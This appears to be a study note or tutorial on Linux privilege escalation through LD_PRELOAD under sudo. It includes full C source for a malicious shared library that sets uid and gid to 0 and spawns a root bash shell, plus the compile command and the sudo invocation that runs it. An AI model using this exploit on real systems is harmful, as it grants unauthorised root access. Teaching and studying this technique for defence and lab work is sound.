Once we do sudo -l, you'll find an environment variable called LD_PRELOAD. 

LD_PRELOAD is also called Preloading. Preloading is a preloading feature of the LD(Dynamic Linker). So, we're gonna be preloading a library(user specific shared library) before any other shared libraries are loaded, meaning we're gonna run sudo here with this LD_PRELOAD and we're going to run it on any command we want but, we're going to be able to execute our own library and preload that before we run anything else. So, we're making a malicious library when we're doing this.

Here's the example that TCM made(shell.c):

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

First we insert all the libraries essential for a C program to run and then this program to run.

Then we unset an environment variable called LD_PRELOAD. Then we set gid and uid as 0, which is root. And he wants the system to be /bin/bash when he runs this.

Then you need to compile this C code. For that you run this command:

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

PIC means Position Independent Code. Basically irrespective of where your shell addressing is, this is still going to work.

Then to run this file, you run this command:

```shell
sudo LD_PRELOAD=<location_of_shell.so> apache2
```